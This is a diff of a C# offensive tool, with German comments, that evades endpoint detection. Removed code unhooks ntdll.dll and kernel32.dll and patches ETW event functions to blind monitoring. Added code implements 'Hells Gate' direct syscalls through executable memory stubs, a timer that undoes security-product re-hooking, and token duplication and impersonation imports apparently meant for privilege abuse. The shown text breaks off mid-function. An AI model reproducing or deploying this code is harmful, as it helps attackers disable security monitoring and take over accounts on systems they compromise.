@@ -5,31 +5,12 @@ using System.Security.Principal;
 using System.Text;
 using System.Collections.Generic;
 using System.IO;
+using System.Threading;
+using System.Linq;
 
 internal static class Program
 {
     #region Native Strukturen & Delegates
-
-    [StructLayout(LayoutKind.Sequential)]
-    public struct LUID
-    {
-        public uint LowPart;
-        public int HighPart;
-    }
-
-    [StructLayout(LayoutKind.Sequential)]
-    public struct LUID_AND_ATTRIBUTES
-    {
-        public LUID Luid;
-        public uint Attributes;
-    }
-
-    [StructLayout(LayoutKind.Sequential)]
-    public struct TOKEN_PRIVILEGES
-    {
-        public uint PrivilegeCount;
-        public LUID_AND_ATTRIBUTES Privileges;
-    }
 
     [StructLayout(LayoutKind.Sequential)]
     public struct OBJECT_ATTRIBUTES
@@ -89,715 +70,481 @@ internal static class Program
         public uint dwThreadId;
     }
 
-    [StructLayout(LayoutKind.Sequential)]
-    public struct TOKEN_MANDATORY_LABEL
-    {
-        public LUID_AND_ATTRIBUTES Label;
-    }
+    // Process Access Rights
+    private const uint PROCESS_ALL_ACCESS = 0x1FFFFF;
 
-    [StructLayout(LayoutKind.Sequential)]
-    public struct UNICODE_STRING
-    {
-        public ushort Length;
-        public ushort MaximumLength;
-        public IntPtr Buffer;
-    }
+    // Token Access Rights
+    private const uint TOKEN_QUERY = 0x0008;
+    private const uint TOKEN_DUPLICATE = 0x0002;
+    private const uint TOKEN_IMPERSONATE = 0x0004;
+    private const uint TOKEN_ALL_ACCESS = 0xF01FF;
 
-    [StructLayout(LayoutKind.Sequential)]
-    public struct CURDIR
-    {
-        public UNICODE_STRING DosPath;
-        public IntPtr Handle;
-    }
-
-    [StructLayout(LayoutKind.Sequential)]
-    public struct RTL_USER_PROCESS_PARAMETERS
-    {
-        public uint Length;
-        public uint MaximumLength;
-        public uint Flags;
-        public uint DebugFlags;
-        public IntPtr ConsoleHandle;
-        public uint ConsoleFlags;
-        public IntPtr StandardInput;
-        public IntPtr StandardOutput;
-        public IntPtr StandardError;
-        public CURDIR CurrentDirectory;
-        public UNICODE_STRING DllPath;
-        public UNICODE_STRING ImagePathName;
-        public UNICODE_STRING CommandLine;
-        public IntPtr Environment;
-        public uint StartingX;
-        public uint StartingY;
-        public uint CountX;
-        public uint CountY;
-        public uint CountCharsX;
-        public uint CountCharsY;
-        public uint FillAttribute;
-        public uint WindowFlags;
-        public uint ShowWindowFlags;
-        public UNICODE_STRING WindowTitle;
-        public UNICODE_STRING DesktopInfo;
-        public UNICODE_STRING ShellInfo;
-        public UNICODE_STRING RuntimeData;
-    }
-
-    [StructLayout(LayoutKind.Sequential)]
-    public struct SECURITY_QUALITY_OF_SERVICE
-    {
-        public uint Length;
-        public int ImpersonationLevel;
-        public byte ContextTrackingMode;
-        public bool EffectiveOnly;
-    }
-
-    // Delegates für Indirect Syscalls
-    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate uint NtOpenProcess(ref IntPtr ProcessHandle, uint DesiredAccess, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID ClientId);
-
-    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate uint NtOpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
-
-    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate uint NtDuplicateToken(IntPtr ExistingTokenHandle, uint DesiredAccess, ref OBJECT_ATTRIBUTES ObjectAttributes, bool EffectiveOnly, int TokenType, out IntPtr NewTokenHandle);
-
-    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate uint NtAdjustPrivilegesToken(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
-
-    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate uint NtClose(IntPtr Handle);
-
-    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate uint NtQueryInformationToken(IntPtr TokenHandle, int TokenInformationClass, IntPtr TokenInformation, uint TokenInformationLength, out uint ReturnLength);
-
-    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate uint NtSetInformationToken(IntPtr TokenHandle, int TokenInformationClass, IntPtr TokenInformation, uint TokenInformationLength);
-
-    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate uint NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref ulong RegionSize, uint AllocationType, uint Protect);
-
-    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate uint NtFreeVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref ulong RegionSize, uint FreeType);
-
-    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate uint NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref ulong RegionSize, uint NewProtect, out uint OldProtect);
-
-    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate uint NtQuerySystemInformation(int SystemInformationClass, IntPtr SystemInformation, int SystemInformationLength, out int ReturnLength);
-
-    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate uint NtCreateUserProcess(ref IntPtr ProcessHandle, ref IntPtr ThreadHandle, uint DesiredAccess, uint ThreadDesiredAccess, ref OBJECT_ATTRIBUTES ProcessAttributes, ref OBJECT_ATTRIBUTES ThreadAttributes, uint ProcessFlags, uint ThreadFlags, IntPtr ProcessParameters, IntPtr CreateInfo, IntPtr AttributeList);
-
-    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate uint NtFlushInstructionCache(IntPtr ProcessHandle, IntPtr BaseAddress, uint RegionSize);
-
-    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate uint RtlCreateProcessParametersEx(out IntPtr pProcessParameters, UNICODE_STRING ImagePathName, UNICODE_STRING DllPath, UNICODE_STRING CurrentDirectory, UNICODE_STRING CommandLine, IntPtr Environment, UNICODE_STRING WindowTitle, UNICODE_STRING DesktopInfo, UNICODE_STRING ShellInfo, UNICODE_STRING RuntimeData, uint Flags);
-
-    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate uint RtlDestroyProcessParameters(IntPtr ProcessParameters);
+    // Memory Protection Constants
+    private const uint PAGE_EXECUTE_READWRITE = 0x40;
+    private const uint PAGE_EXECUTE_READ = 0x20;
+    private const uint PAGE_READWRITE = 0x04;
+    private const uint MEM_COMMIT = 0x1000;
+    private const uint MEM_RESERVE = 0x2000;
 
     #endregion
 
-    #region EDR Silencing & Unhooking (ntdll.dll + kernel32.dll)
+    #region Win32 API
 
-    private static class EDRAntiAnalysis
+    [DllImport("advapi32.dll", SetLastError = true)]
+    static extern bool CreateProcessAsUser(
+        IntPtr hToken,
+        string lpApplicationName,
+        string lpCommandLine,
+        IntPtr lpProcessAttributes,
+        IntPtr lpThreadAttributes,
+        bool bInheritHandles,
+        uint dwCreationFlags,
+        IntPtr lpEnvironment,
+        string lpCurrentDirectory,
+        ref STARTUPINFO lpStartupInfo,
+        out PROCESS_INFORMATION lpProcessInformation);
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    static extern bool RevertToSelf();
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern bool CloseHandle(IntPtr hObject);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern IntPtr GetCurrentProcess();
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern IntPtr GetModuleHandle(string lpModuleName);
+
+    private const uint CREATE_NEW_CONSOLE = 0x00000010;
+    private const uint STARTF_USESHOWWINDOW = 0x00000001;
+    private const short SW_SHOWNORMAL = 1;
+    private const uint MEM_RELEASE = 0x8000;
+
+    #endregion
+
+    #region Hells Gate - Direkte Syscalls
+
+    private static class HellsGate
     {
-        private const uint PAGE_READWRITE = 0x04;
-        private const uint PAGE_EXECUTE_READWRITE = 0x40;
-        private const uint MEM_COMMIT = 0x1000;
-        private const uint MEM_RESERVE = 0x2000;
-        private const uint MEM_RELEASE = 0x8000;
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate int NtOpenProcessDirect(ref IntPtr ProcessHandle, uint DesiredAccess, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID ClientId);
 
-        private static NtAllocateVirtualMemory _NtAllocateVirtualMemory;
-        private static NtFreeVirtualMemory _NtFreeVirtualMemory;
-        private static NtProtectVirtualMemory _NtProtectVirtualMemory;
-        private static NtClose _NtClose;
-        private static NtQuerySystemInformation _NtQuerySystemInformation;
-        private static NtFlushInstructionCache _NtFlushInstructionCache;
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate int NtOpenProcessTokenDirect(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
 
-        public static void InitializeSyscallsForSilencing()
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate int NtDuplicateTokenDirect(IntPtr ExistingTokenHandle, uint DesiredAccess, ref OBJECT_ATTRIBUTES ObjectAttributes, bool EffectiveOnly, int TokenType, out IntPtr NewTokenHandle);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate int NtCloseDirect(IntPtr Handle);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate int NtQueryInformationTokenDirect(IntPtr TokenHandle, int TokenInformationClass, IntPtr TokenInformation, uint TokenInformationLength, out uint ReturnLength);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate int NtProtectVirtualMemoryDirect(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref ulong RegionSize, uint NewProtect, out uint OldProtect);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate int NtFlushInstructionCacheDirect(IntPtr ProcessHandle, IntPtr BaseAddress, uint RegionSize);
+
+        private static Dictionary<string, IntPtr> _syscallStubs = new Dictionary<string, IntPtr>();
+        private static Dictionary<string, ushort> _syscallNumbers = new Dictionary<string, ushort>();
+
+        public static bool Initialize()
         {
-            _NtAllocateVirtualMemory = SyscallAPI.GetSyscall<NtAllocateVirtualMemory>("NtAllocateVirtualMemory");
-            _NtFreeVirtualMemory = SyscallAPI.GetSyscall<NtFreeVirtualMemory>("NtFreeVirtualMemory");
-            _NtProtectVirtualMemory = SyscallAPI.GetSyscall<NtProtectVirtualMemory>("NtProtectVirtualMemory");
-            _NtClose = SyscallAPI.GetSyscall<NtClose>("NtClose");
-            _NtQuerySystemInformation = SyscallAPI.GetSyscall<NtQuerySystemInformation>("NtQuerySystemInformation");
-            _NtFlushInstructionCache = SyscallAPI.GetSyscall<NtFlushInstructionCache>("NtFlushInstructionCache");
-        }
+            Console.WriteLine("[Hells Gate] Initializing direct syscalls...");
 
-        private static IntPtr GetCurrentProcessHandle() => (IntPtr)(-1);
-
-        private static IntPtr GetModuleBaseAddressSyscall(string moduleName)
-        {
             try
             {
-                foreach (ProcessModule module in Process.GetCurrentProcess().Modules)
+                string ntdllPath = Path.Combine(Environment.SystemDirectory, "ntdll.dll");
+                byte[] ntdllBytes = File.ReadAllBytes(ntdllPath);
+
+                string[] syscalls = { "NtOpenProcess", "NtOpenProcessToken", "NtDuplicateToken",
+                                      "NtClose", "NtQueryInformationToken", "NtProtectVirtualMemory",
+                                      "NtFlushInstructionCache" };
+
+                foreach (string syscall in syscalls)
                 {
-                    if (module.ModuleName.Equals(moduleName, StringComparison.OrdinalIgnoreCase))
-                        return module.BaseAddress;
+                    ushort ssn = ExtractSSNFromPE(ntdllBytes, syscall);
+                    if (ssn != 0)
+                    {
+                        _syscallNumbers[syscall] = ssn;
+                        CreateSyscallStub(syscall, ssn);
+                        Console.WriteLine($"[Hells Gate] {syscall} -> SSN: {ssn}");
+                    }
                 }
+
+                return _syscallStubs.Count > 0;
             }
-            catch { }
-            return IntPtr.Zero;
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[Hells Gate] Failed: {ex.Message}");
+                return false;
+            }
         }
 
-        private static IntPtr GetFunctionAddressSyscall(IntPtr moduleBase, string functionName)
+        private static ushort ExtractSSNFromPE(byte[] peData, string functionName)
         {
             try
             {
-                int e_lfanew = Marshal.ReadInt32(moduleBase, 0x3C);
-                int exportRVA = Marshal.ReadInt32(moduleBase, e_lfanew + 0x88);
-                if (exportRVA == 0) return IntPtr.Zero;
+                int e_lfanew = BitConverter.ToInt32(peData, 0x3C);
+                int exportRVA = BitConverter.ToInt32(peData, e_lfanew + 0x88);
+                if (exportRVA == 0) return 0;
 
-                IntPtr exportDir = (IntPtr)((long)moduleBase + exportRVA);
-                int numberOfNames = Marshal.ReadInt32(exportDir, 0x18);
-                IntPtr namesRVA = (IntPtr)((long)moduleBase + Marshal.ReadInt32(exportDir, 0x20));
-                IntPtr ordinalsRVA = (IntPtr)((long)moduleBase + Marshal.ReadInt32(exportDir, 0x24));
-                IntPtr functionsRVA = (IntPtr)((long)moduleBase + Marshal.ReadInt32(exportDir, 0x1C));
+                int numberOfNames = BitConverter.ToInt32(peData, exportRVA + 0x18);
+                int addressOfNames = BitConverter.ToInt32(peData, exportRVA + 0x20);
+                int addressOfNameOrdinals = BitConverter.ToInt32(peData, exportRVA + 0x24);
+                int addressOfFunctions = BitConverter.ToInt32(peData, exportRVA + 0x1C);
 
                 for (int i = 0; i < numberOfNames; i++)
                 {
-                    IntPtr nameRVA = (IntPtr)((long)moduleBase + Marshal.ReadInt32(namesRVA, i * 4));
-                    string name = Marshal.PtrToStringAnsi(nameRVA);
+                    int nameRVA = BitConverter.ToInt32(peData, addressOfNames + i * 4);
+                    string name = ReadStringFromPE(peData, nameRVA);
+
                     if (name == functionName)
                     {
-                        short ordinal = Marshal.ReadInt16(ordinalsRVA, i * 2);
-                        int functionRVA = Marshal.ReadInt32(functionsRVA, ordinal * 4);
-                        return (IntPtr)((long)moduleBase + functionRVA);
+                        short ordinal = BitConverter.ToInt16(peData, addressOfNameOrdinals + i * 2);
+                        int functionRVA = BitConverter.ToInt32(peData, addressOfFunctions + ordinal * 4);
+                        return ExtractSSNFromStub(peData, functionRVA);
                     }
                 }
             }
             catch { }
-            return IntPtr.Zero;
+            return 0;
         }
 
-        private static bool OverwriteTextSectionSyscall(IntPtr targetModule, IntPtr sourceModule)
+        private static string ReadStringFromPE(byte[] peData, int rva)
+        {
+            List<byte> bytes = new List<byte>();
+            int offset = rva;
+            while (offset < peData.Length && peData[offset] != 0)
+            {
+                bytes.Add(peData[offset]);
+                offset++;
+            }
+            return Encoding.ASCII.GetString(bytes.ToArray());
+        }
+
+        private static ushort ExtractSSNFromStub(byte[] peData, int rva)
         {
             try
             {
-                int e_lfanew = Marshal.ReadInt32(targetModule, 0x3C);
-                short numberOfSections = Marshal.ReadInt16(targetModule, e_lfanew + 0x06);
-                int sizeOfOptionalHeader = Marshal.ReadInt16(targetModule, e_lfanew + 0x14);
-                IntPtr sectionHeaderPtr = (IntPtr)((long)targetModule + e_lfanew + 0x18 + sizeOfOptionalHeader);
+                int offset = rva;
+                for (int i = 0; i < 32 && offset + i < peData.Length - 4; i++)
+                {
+                    if (peData[offset + i] == 0xB8)
+                    {
+                        return BitConverter.ToUInt16(peData, offset + i + 1);
+                    }
+                }
+            }
+            catch { }
+            return 0;
+        }
+
+        private static void CreateSyscallStub(string name, ushort ssn)
+        {
+            byte[] stub = new byte[]
+            {
+                0xB8, 0x00, 0x00, 0x00, 0x00,  // mov eax, ssn
+                0x4C, 0x8B, 0xD1,              // mov r10, rcx
+                0x0F, 0x05,                    // syscall
+                0xC3                           // ret
+            };
+
+            byte[] ssnBytes = BitConverter.GetBytes((uint)ssn);
+            Buffer.BlockCopy(ssnBytes, 0, stub, 1, 4);
+
+            IntPtr stubAddr = VirtualAlloc(IntPtr.Zero, (uint)stub.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+            if (stubAddr != IntPtr.Zero)
+            {
+                Marshal.Copy(stub, 0, stubAddr, stub.Length);
+                _syscallStubs[name] = stubAddr;
+            }
+        }
+
+        public static T GetSyscall<T>(string name) where T : class
+        {
+            if (_syscallStubs.ContainsKey(name))
+            {
+                return Marshal.GetDelegateForFunctionPointer<T>(_syscallStubs[name]);
+            }
+            return null;
+        }
+
+        public static void Cleanup()
+        {
+            foreach (var stub in _syscallStubs.Values)
+            {
+                VirtualFree(stub, 0, MEM_RELEASE);
+            }
+            _syscallStubs.Clear();
+        }
+    }
+
+    #endregion
+
+    #region Text Section Protector
+
+    private static class TextSectionProtector
+    {
+        private static HellsGate.NtProtectVirtualMemoryDirect _ntProtect;
+        private static HellsGate.NtFlushInstructionCacheDirect _ntFlush;
+        private static Timer _protectionTimer;
+        private static Dictionary<string, Tuple<IntPtr, int, byte[]>> _protectedSections = new Dictionary<string, Tuple<IntPtr, int, byte[]>>();
+
+        public static void Initialize()
+        {
+            _ntProtect = HellsGate.GetSyscall<HellsGate.NtProtectVirtualMemoryDirect>("NtProtectVirtualMemory");
+            _ntFlush = HellsGate.GetSyscall<HellsGate.NtFlushInstructionCacheDirect>("NtFlushInstructionCache");
+
+            if (_ntProtect != null)
+                Console.WriteLine("[Protector] Initialized");
+            else
+                Console.WriteLine("[Protector] Warning: NtProtectVirtualMemory not available");
+        }
+
+        private static IntPtr GetModuleBase(string moduleName)
+        {
+            foreach (ProcessModule module in Process.GetCurrentProcess().Modules)
+            {
+                if (module.ModuleName.Equals(moduleName, StringComparison.OrdinalIgnoreCase))
+                    return module.BaseAddress;
+            }
+            return IntPtr.Zero;
+        }
+
+        public static bool ProtectTextSection(string moduleName)
+        {
+            if (_ntProtect == null) return false;
+
+            try
+            {
+                IntPtr moduleBase = GetModuleBase(moduleName);
+                if (moduleBase == IntPtr.Zero) return false;
+
+                int e_lfanew = Marshal.ReadInt32(moduleBase, 0x3C);
+                short numberOfSections = Marshal.ReadInt16(moduleBase, e_lfanew + 0x06);
+                int sizeOfOptionalHeader = Marshal.ReadInt16(moduleBase, e_lfanew + 0x14);
+                IntPtr sectionHeaderPtr = (IntPtr)((long)moduleBase + e_lfanew + 0x18 + sizeOfOptionalHeader);
 
                 for (int i = 0; i < numberOfSections; i++)
                 {
-                    string sectionName = Marshal.PtrToStringAnsi(sectionHeaderPtr);
+                    string sectionName = Marshal.PtrToStringAnsi(sectionHeaderPtr, 8);
                     if (sectionName == ".text")
                     {
                         int virtualAddress = Marshal.ReadInt32(sectionHeaderPtr, 0x0C);
                         int sizeOfRawData = Marshal.ReadInt32(sectionHeaderPtr, 0x10);
-                        IntPtr targetAddr = (IntPtr)((long)targetModule + virtualAddress);
+                        IntPtr sectionStart = (IntPtr)((long)moduleBase + virtualAddress);
 
+                        // Cleanen Zustand speichern
                         byte[] cleanBytes = new byte[sizeOfRawData];
-                        Marshal.Copy((IntPtr)((long)sourceModule + virtualAddress), cleanBytes, 0, sizeOfRawData);
+                        Marshal.Copy(sectionStart, cleanBytes, 0, sizeOfRawData);
 
                         ulong regionSize = (ulong)sizeOfRawData;
-                        IntPtr baseAddr = targetAddr;
-                        _NtProtectVirtualMemory(GetCurrentProcessHandle(), ref baseAddr, ref regionSize, PAGE_EXECUTE_READWRITE, out uint oldProtect);
-                        Marshal.Copy(cleanBytes, 0, targetAddr, sizeOfRawData);
-                        _NtProtectVirtualMemory(GetCurrentProcessHandle(), ref baseAddr, ref regionSize, oldProtect, out oldProtect);
-                        _NtFlushInstructionCache(GetCurrentProcessHandle(), targetAddr, (uint)sizeOfRawData);
-                        return true;
+                        IntPtr baseAddr = sectionStart;
+
+                        int status = _ntProtect((IntPtr)(-1), ref baseAddr, ref regionSize, PAGE_EXECUTE_READ, out uint oldProtect);
+
+                        if (status == 0)
+                        {
+                            _protectedSections[moduleName] = Tuple.Create(sectionStart, sizeOfRawData, cleanBytes);
+                            Console.WriteLine($"[Protector] Protected {moduleName}.text (RX) - {sizeOfRawData} bytes");
+                            return true;
+                        }
+                        else
+                        {
+                            Console.WriteLine($"[Protector] Failed to protect {moduleName}.text: 0x{status:X8}");
+                        }
+                        break;
                     }
                     sectionHeaderPtr = (IntPtr)((long)sectionHeaderPtr + 40);
                 }
             }
-            catch { }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[Protector] Error: {ex.Message}");
+            }
             return false;
         }
 
-        public static bool UnhookModule(string moduleName)
+        public static void StartRehookProtection(int intervalMs = 3000)
         {
-            try
+            if (_protectedSections.Count == 0)
             {
-                string systemPath = Environment.SystemDirectory;
-                string cleanDllPath = Path.Combine(systemPath, moduleName);
-
-                IntPtr loadedModule = GetModuleBaseAddressSyscall(moduleName);
-                if (loadedModule == IntPtr.Zero) return false;
-
-                IntPtr cleanModule = LoadLibraryWin32(cleanDllPath);
-                if (cleanModule == IntPtr.Zero) return false;
-
-                bool result = OverwriteTextSectionSyscall(loadedModule, cleanModule);
-                FreeLibraryWin32(cleanModule);
-                return result;
+                Console.WriteLine("[Protector] No sections to protect");
+                return;
             }
-            catch
+
+            Console.WriteLine($"[Protector] Starting re-hook protection (interval: {intervalMs}ms)");
+
+            _protectionTimer = new Timer((state) =>
             {
-                return false;
-            }
-        }
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        static extern IntPtr LoadLibrary(string lpFileName);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        static extern bool FreeLibrary(IntPtr hModule);
-
-        private static IntPtr LoadLibraryWin32(string path) => LoadLibrary(path);
-        private static void FreeLibraryWin32(IntPtr module) => FreeLibrary(module);
-
-        public static bool DisableEtwSyscall()
-        {
-            try
-            {
-                IntPtr ntdll = GetModuleBaseAddressSyscall("ntdll.dll");
-                if (ntdll == IntPtr.Zero) return false;
-
-                string[] etwFunctions = { "EtwEventWrite", "EtwEventRegister", "EtwEventWriteFull", "EtwEventWriteTransfer" };
-                byte[] retPatch = { 0xC3 };
-                byte[] xorRetPatch = { 0x48, 0x33, 0xC0, 0xC3 };
-
-                foreach (string func in etwFunctions)
+                foreach (var kvp in _protectedSections)
                 {
-                    IntPtr funcAddr = GetFunctionAddressSyscall(ntdll, func);
-                    if (funcAddr != IntPtr.Zero)
+                    string name = kvp.Key;
+                    IntPtr sectionStart = kvp.Value.Item1;
+                    int sectionSize = kvp.Value.Item2;
+                    byte[] cleanBytes = kvp.Value.Item3;
+
+                    try
                     {
-                        ulong regionSize = (ulong)retPatch.Length;
-                        IntPtr baseAddr = funcAddr;
-                        _NtProtectVirtualMemory(GetCurrentProcessHandle(), ref baseAddr, ref regionSize, PAGE_EXECUTE_READWRITE, out uint oldProtect);
+                        byte[] currentBytes = new byte[sectionSize];
+                        Marshal.Copy(sectionStart, currentBytes, 0, sectionSize);
 
-                        if (func == "EtwEventWrite" || func == "EtwEventWriteTransfer")
-                            Marshal.Copy(xorRetPatch, 0, funcAddr, xorRetPatch.Length);
-                        else
-                            Marshal.Copy(retPatch, 0, funcAddr, retPatch.Length);
+                        bool modified = false;
+                        for (int i = 0; i < sectionSize && !modified; i++)
+                        {
+                            if (currentBytes[i] != cleanBytes[i])
+                                modified = true;
+                        }
 
-                        _NtProtectVirtualMemory(GetCurrentProcessHandle(), ref baseAddr, ref regionSize, oldProtect, out oldProtect);
-                        _NtFlushInstructionCache(GetCurrentProcessHandle(), funcAddr, (uint)retPatch.Length);
+                        if (modified)
+                        {
+                            Console.WriteLine($"[!] DETECTED: {name}.text was modified! Restoring...");
+
+                            ulong regionSize = (ulong)sectionSize;
+                            IntPtr baseAddr = sectionStart;
+                            _ntProtect((IntPtr)(-1), ref baseAddr, ref regionSize, PAGE_READWRITE, out uint oldProtect);
+                            Marshal.Copy(cleanBytes, 0, sectionStart, sectionSize);
+                            _ntProtect((IntPtr)(-1), ref baseAddr, ref regionSize, PAGE_EXECUTE_READ, out oldProtect);
+                            _ntFlush?.Invoke((IntPtr)(-1), sectionStart, (uint)sectionSize);
+
+                            Console.WriteLine($"[Protector] Restored {name}.text");
+                        }
                     }
+                    catch { }
                 }
-                return true;
-            }
-            catch
-            {
-                return false;
-            }
+            }, null, intervalMs, intervalMs);
         }
 
-        public static void SilenceEDR()
+        public static void StopProtection()
         {
-            Console.WriteLine("[*] Starting EDR Silencing...");
-            InitializeSyscallsForSilencing();
-
-            if (UnhookModule("ntdll.dll"))
-                Console.WriteLine("[+] ntdll.dll unhooked");
-            else
-                Console.WriteLine("[-] ntdll.dll unhooking failed");
-
-            if (UnhookModule("kernel32.dll"))
-                Console.WriteLine("[+] kernel32.dll unhooked");
-            else
-                Console.WriteLine("[-] kernel32.dll unhooking failed");
-
-            if (DisableEtwSyscall())
-                Console.WriteLine("[+] ETW disabled via syscall");
-            else
-                Console.WriteLine("[-] ETW disabling failed");
-
-            Console.WriteLine("[*] EDR Silencing complete");
+            _protectionTimer?.Dispose();
+            Console.WriteLine("[Protector] Stopped re-hook protection");
         }
     }
 
     #endregion
 
-    #region Dynamische API-Resolve für alle Syscalls
-
-    private static class SyscallAPI
-    {
-        private static Dictionary<string, Delegate> syscallCache = new Dictionary<string, Delegate>();
-        
-        // Pre-resolved base syscalls für die Initialisierung
-        private static NtAllocateVirtualMemory _baseNtAllocate;
-        private static NtFreeVirtualMemory _baseNtFree;
-        private static NtProtectVirtualMemory _baseNtProtect;
-        
-        public static IntPtr GetModuleBase(string moduleName)
-        {
-            try
-            {
-                foreach (ProcessModule module in Process.GetCurrentProcess().Modules)
-                {
-                    if (module.ModuleName.Equals(moduleName, StringComparison.OrdinalIgnoreCase))
-                        return module.BaseAddress;
-                }
-            }
-            catch { }
-            return IntPtr.Zero;
-        }
-
-        public static IntPtr GetFunctionAddress(IntPtr moduleBase, string functionName)
-        {
-            try
-            {
-                int e_lfanew = Marshal.ReadInt32(moduleBase, 0x3C);
-                int exportRVA = Marshal.ReadInt32(moduleBase, e_lfanew + 0x88);
-                if (exportRVA == 0) return IntPtr.Zero;
-
-                IntPtr exportDir = (IntPtr)((long)moduleBase + exportRVA);
-                int numberOfNames = Marshal.ReadInt32(exportDir, 0x18);
-                IntPtr namesRVA = (IntPtr)((long)moduleBase + Marshal.ReadInt32(exportDir, 0x20));
-                IntPtr ordinalsRVA = (IntPtr)((long)moduleBase + Marshal.ReadInt32(exportDir, 0x24));
-                IntPtr functionsRVA = (IntPtr)((long)moduleBase + Marshal.ReadInt32(exportDir, 0x1C));
-
-                for (int i = 0; i < numberOfNames; i++)
-                {
-                    IntPtr nameRVA = (IntPtr)((long)moduleBase + Marshal.ReadInt32(namesRVA, i * 4));
-                    string name = Marshal.PtrToStringAnsi(nameRVA);
-                    if (name == functionName)
-                    {
-                        short ordinal = Marshal.ReadInt16(ordinalsRVA, i * 2);
-                        int functionRVA = Marshal.ReadInt32(functionsRVA, ordinal * 4);
-                        return (IntPtr)((long)moduleBase + functionRVA);
-                    }
-                }
-            }
-            catch { }
-            return IntPtr.Zero;
-        }
-
-        public static uint ExtractSSN(IntPtr functionPtr)
-        {
-            try
-            {
-                byte[] stub = new byte[32];
-                Marshal.Copy(functionPtr, stub, 0, 32);
-
-                for (int i = 0; i < 28; i++)
-                {
-                    if (stub[i] == 0xB8)
-                    {
-                        return BitConverter.ToUInt32(stub, i + 1);
-                    }
-                }
-                return (uint)Marshal.ReadInt32(functionPtr, 4);
-            }
-            catch
-            {
-                return 0;
-            }
-        }
-
-        public static byte[] CreateSyscallStub(uint ssn)
-        {
-            byte[] stub = new byte[]
-            {
-                0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00,
-                0x48, 0x8B, 0x40, 0x18,
-                0x48, 0x8B, 0x40, 0x20,
-                0x48, 0x8B, 0x40, 0x20,
-                0x48, 0x8B, 0x08,
-                0x48, 0x8B, 0x09,
-                0x48, 0x8B, 0x01,
-                0x4C, 0x8B, 0xD1,
-                0xB8, 0x00, 0x00, 0x00, 0x00,
-                0x0F, 0x05,
-                0xC3
-            };
-            byte[] ssnBytes = BitConverter.GetBytes(ssn);
-            Buffer.BlockCopy(ssnBytes, 0, stub, 24, 4);
-            return stub;
-        }
-        
-        // Initialize base syscalls using VirtualAlloc (Win32 API) - nur einmal am Anfang
-        public static void InitializeBaseSyscalls()
-        {
-            IntPtr ntdll = GetModuleBase("ntdll.dll");
-            if (ntdll == IntPtr.Zero) return;
-            
-            uint ssnAlloc = ExtractSSN(GetFunctionAddress(ntdll, "NtAllocateVirtualMemory"));
-            uint ssnFree = ExtractSSN(GetFunctionAddress(ntdll, "NtFreeVirtualMemory"));
-            uint ssnProtect = ExtractSSN(GetFunctionAddress(ntdll, "NtProtectVirtualMemory"));
-            
-            if (ssnAlloc == 0 || ssnFree == 0 || ssnProtect == 0) return;
-            
-            byte[] stubAlloc = CreateSyscallStub(ssnAlloc);
-            byte[] stubFree = CreateSyscallStub(ssnFree);
-            byte[] stubProtect = CreateSyscallStub(ssnProtect);
-            
-            IntPtr pAlloc = VirtualAllocWin32(IntPtr.Zero, (uint)stubAlloc.Length, 0x1000 | 0x2000, 0x40);
-            IntPtr pFree = VirtualAllocWin32(IntPtr.Zero, (uint)stubFree.Length, 0x1000 | 0x2000, 0x40);
-            IntPtr pProtect = VirtualAllocWin32(IntPtr.Zero, (uint)stubProtect.Length, 0x1000 | 0x2000, 0x40);
-            
